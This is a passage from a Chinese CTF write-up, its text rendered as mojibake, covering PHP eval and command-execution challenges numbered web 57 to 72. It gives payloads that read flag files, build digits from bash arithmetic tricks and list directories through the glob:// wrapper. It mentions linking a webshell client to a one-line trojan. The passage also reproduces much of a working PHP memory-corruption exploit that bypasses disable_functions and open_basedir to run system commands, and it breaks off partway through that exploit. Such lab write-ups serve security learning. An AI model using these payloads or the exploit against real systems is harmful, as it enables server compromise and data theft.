class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çŸ¥é“flagåœ¨36.php.é‚£ä¹ˆæˆ‘ä»¬æ„é€ c=36å³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">åœ¨LINUXä¸‹ï¼š</span><br><span class="line">    $(())=<span class="number">0</span></span><br><span class="line">    $((~$(())))=-<span class="number">1</span></span><br><span class="line">    ä¸ºäº†æ–¹ä¾¿ç†è§£ã€‚æˆ‘ä»¬æŠŠ-<span class="number">1</span>è®¾ä¸ºa.å³a=$((~$(())))=-<span class="number">1</span></span><br><span class="line">    é‚£ä¹ˆ$((aaaa))=-<span class="number">4</span>  å³è¿™ä¸ªè¡¨è¾¾å¼é‡Œé¢æ˜¯é»˜è®¤åŠ çš„</span><br><span class="line">    $((~$((aaaa))))=<span class="number">3</span> å–åå‡<span class="number">1</span>äº†ã€‚</span><br><span class="line">    é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æ„é€ <span class="number">37</span>ä¸ªa</span><br><span class="line">    </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">$((~$((aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa))))</span><br><span class="line">å†å°†aæ›¿æ¢æˆ$((~$(())))</span><br><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/Chny876cXZGDFHp.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916205453781"></p><p>æ‹¿åˆ°flagã€‚</p><h3 id="web-58-disable-functionsç»•è¿‡"><a href="#web-58-disable-functionsç»•è¿‡" class="headerlink" title="web 58:disable_functionsç»•è¿‡"></a>web 58:disable_functionsç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload:c=show_source(&#x27;/var/www/html/flag.php&#x27;);</span></span><br><span class="line"><span class="comment">### web 59:</span></span><br><span class="line"><span class="comment">#payload:c=show_source(&#x27;/var/www/html/flag.php&#x27;);</span></span><br><span class="line"><span class="comment">### web 60:</span></span><br><span class="line"><span class="comment">#payload:c=show_source(&#x27;/var/www/html/flag.php&#x27;);</span></span><br><span class="line"><span class="comment">### web 61:</span></span><br><span class="line"><span class="comment">#payload:c=show_source(&#x27;/var/www/html/flag.php&#x27;);</span></span><br><span class="line"><span class="comment">### web 63:</span></span><br><span class="line"><span class="comment">#payload:c=show_source(&#x27;/var/www/html/flag.php&#x27;);</span></span><br><span class="line"><span class="comment">### web 64:</span></span><br><span class="line"><span class="comment">#payload:c=show_source(&#x27;/var/www/html/flag.php&#x27;);</span></span><br><span class="line"><span class="comment">### web 65:</span></span><br><span class="line"><span class="comment">#payload:c=show_source(&#x27;/var/www/html/flag.php&#x27;);</span></span><br><span class="line"><span class="comment">### web 66:banäº† show_source</span></span><br><span class="line"><span class="comment">#payload:c=print_r(scandir(&quot;../../../&quot;));</span></span><br><span class="line"><span class="comment">#payload:c=highlight_file(&quot;/flag.txt&quot;);</span></span><br><span class="line"><span class="comment">### web 67:</span></span><br><span class="line"><span class="comment">#payload:c=highlight_file(&quot;/flag.txt&quot;);</span></span><br><span class="line"><span class="comment">### web 68:banäº†æ›´å¤šäº†ï¼Œè¿™é‡Œåˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´ã€‚txtå¯ä»¥ç›´æ¥åŒ…å«ã€‚phpç”¨ä¼ªåè®®ã€‚</span></span><br><span class="line"><span class="comment">#paylaod:c=include(&quot;/flag.txt&quot;);</span></span><br><span class="line"><span class="comment">### web 69:</span></span><br><span class="line"><span class="comment">#paylaod:c=include(&quot;/flag.txt&quot;);</span></span><br><span class="line"><span class="comment">### web 70:</span></span><br><span class="line"><span class="comment">#paylaod:c=include(&quot;/flag.txt&quot;);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°é¢˜ç›®æˆ‘ä»¥ä¸ºï¼Ÿï¼Ÿå°±è¿™ï¼Ÿï¼Ÿç›´æ¥ä¸€ä¸ªsystem(â€œlsâ€).å‘ç°systemè¢«banäº†ã€‚</p><p>å‘ç°æˆ‘æœ€ä¸Šé¢åˆ—çš„éƒ½è¢«banäº†ã€‚phpinfoä¹Ÿè¢«Banäº†ã€‚</p><p>ä½†æ˜¯ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬å—ï¼Ÿé‚£ç›´æ¥è¿æ¥èšå‰‘ä¸Šå·å³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">é¢„æœŸè§£æ³•ï¼š</span><br><span class="line">    å› ä¸ºæˆ‘ä»¬ä¸èƒ½åˆ©ç”¨å‘½ä»¤æ‰§è¡Œå»è¯»å–æ–‡ä»¶äº†ã€‚å› æ­¤æˆ‘ä»¬åªèƒ½åˆ©ç”¨phpçš„ä»£ç æ‰§è¡Œå»è¯»æ–‡ä»¶ã€‚å¸¸è§çš„phpè¯»æ–‡ä»¶æœ‰</span><br><span class="line"><span class="number">1</span>. highlight_file()</span><br><span class="line"><span class="number">2</span>. file_get_contents()</span><br><span class="line"><span class="number">3</span>. show_source()</span><br><span class="line"><span class="number">4</span>. fgets()</span><br><span class="line"><span class="number">5</span>. file()</span><br><span class="line"><span class="number">6</span>. readfile()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å…¶å®ƒå§¿åŠ¿ï¼š</span><br><span class="line">c=<span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgets(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">copy(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line">rename(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>); </span><br></pre></td></tr></table></figure><h3 id="web-71-æå‰ç»ˆæ­¢"><a href="#web-71-æå‰ç»ˆæ­¢" class="headerlink" title="web 71:æå‰ç»ˆæ­¢"></a>web 71:æå‰ç»ˆæ­¢</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">ä½ è¦ä¸Šå¤©å—ï¼Ÿ</span><br><span class="line"><span class="comment">#payload:include(&quot;/flag.txt&quot;);die;æˆ–è€…include(&quot;/flag.txt&quot;);exit();</span></span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯ç”¨ä¸Šé¢çš„payloadé€šï¼Œå‘ç°å­—æ¯æ•°å­—å…¨éƒ¨è¢«æ›¿æ¢æˆäº†?ã€‚è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥æå‰ç»ˆæ­¢æ‰§è¡Œã€‚</p><h3 id="web-72-ç»•è¿‡open-dirå’Œdisabled-functions-glob-ä¼ªåè®®"><a href="#web-72-ç»•è¿‡open-dirå’Œdisabled-functions-glob-ä¼ªåè®®" class="headerlink" title="web 72:ç»•è¿‡open_dirå’Œdisabled_functions.glob://ä¼ªåè®®"></a>web 72:ç»•è¿‡open_dirå’Œdisabled_functions.glob://ä¼ªåè®®</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ä½ è¦ä¸Šå¤©å—ï¼Ÿ</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>open_basedir():é™å®šç”¨æˆ·çš„è®¿é—®ç›®å½•ä¸ºå‚æ•°é‡Œçš„ç›®å½•ã€‚</p><p>glob:ä¼ªåè®®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span><br><span class="line">ä¾‹:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// å¾ªç¯ ext/spl/examples/ ç›®å½•é‡Œæ‰€æœ‰ *.php æ–‡ä»¶</span></span><br><span class="line"><span class="comment">// å¹¶æ‰“å°æ–‡ä»¶åå’Œæ–‡ä»¶å°ºå¯¸</span></span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob://ext/spl/examples/*.php&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    printf(<span class="string">&quot;%s: %.1FK\n&quot;</span>, <span class="variable">$f</span>-&gt;getFilename(), <span class="variable">$f</span>-&gt;getSize()/<span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">é‚£ä¹ˆæˆ‘ä»¬è¦æ‰“å°æ ¹ç›®å½•æ‰€æœ‰æ–‡ä»¶ï¼š</span><br><span class="line"><span class="comment">#c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot;||&quot;;&#125;exit();</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°flagæ–‡ä»¶ä¸ºflag0.txtã€‚ä½†æ˜¯æˆ‘ä»¬ä¾ç„¶ä¸èƒ½ä½¿ç”¨include(â€œ/flag0.txtâ€); å› ä¸ºopen_basedir()çš„å­˜åœ¨ï¼Œé™å®šäº†æˆ‘ä»¬çš„è®¿é—®ç›®å½•ã€‚</p><p>åˆ©ç”¨èšå‰‘æ’ä»¶æˆ–è€…è„šæœ¬ç»•è¿‡open_basedir()å’Œdisabled_function():</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">pwn(<span class="string">&quot;uname -a&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant 